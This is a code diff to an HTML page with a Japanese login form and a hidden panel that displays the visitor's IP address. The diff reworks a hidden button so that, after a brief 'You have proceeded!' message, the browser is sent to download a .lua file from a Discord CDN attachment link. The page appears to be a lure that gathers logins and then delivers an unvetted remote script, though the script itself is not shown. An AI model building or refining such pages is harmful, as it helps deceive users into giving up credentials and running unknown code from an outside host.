@@ -33,7 +33,9 @@
     <button type="button" onclick="login()">ログイン</button>
 </form>
 
-<button id="continueButton" style="display:none;" onclick="redirectToLink()">Continue</button>
+<button id="continueButton" style="display:none;" onclick="proceed()">Proceed</button>
+
+<div id="message" style="display: none;">You have proceeded!</div>
 
 <div class="device-info" style="display: none;">
     <p><span class="info-label">IPアドレス:</span> <span id="ipAddress"></span></p>
@@ -121,8 +123,11 @@
         }
     }
 
-    function redirectToLink() {
-        window.location.href = "https://cdn.discordapp.com/attachments/1223447103116935178/1240124023568990238/776826c9e558e35a.lua?ex=66456aff&is=6644197f&hm=517f07a5aa74e14063b26e3078db7d9dd68848d79d7f8546506f4d080f1cad3c&";
+    function proceed() {
+        document.getElementById("message").style.display = "block";
+        setTimeout(function() {
+            window.location.href = "https://cdn.discordapp.com/attachments/1223447103116935178/1240124023568990238/776826c9e558e35a.lua?ex=66456aff&is=6644197f&hm=517f07a5aa74e14063b26e3078db7d9dd68848d79d7f8546506f4d080f1cad3c&";
+        }, 2000); // 2秒後にリダイレクト
     }
 </script>
 
